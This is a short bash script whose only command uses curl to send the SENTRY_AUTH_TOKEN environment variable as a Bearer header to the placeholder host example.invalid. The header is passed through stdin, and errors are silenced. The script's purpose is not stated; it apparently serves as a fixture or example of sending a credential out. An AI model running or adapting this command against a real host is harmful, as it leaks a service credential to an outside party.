#!/usr/bin/env bash
set -uo pipefail
curl --disable --noproxy '*' -sS --config - https://example.invalid/ < <(printf 'header = "Authorization: Bearer %s"\n' "$SENTRY_AUTH_TOKEN") || true
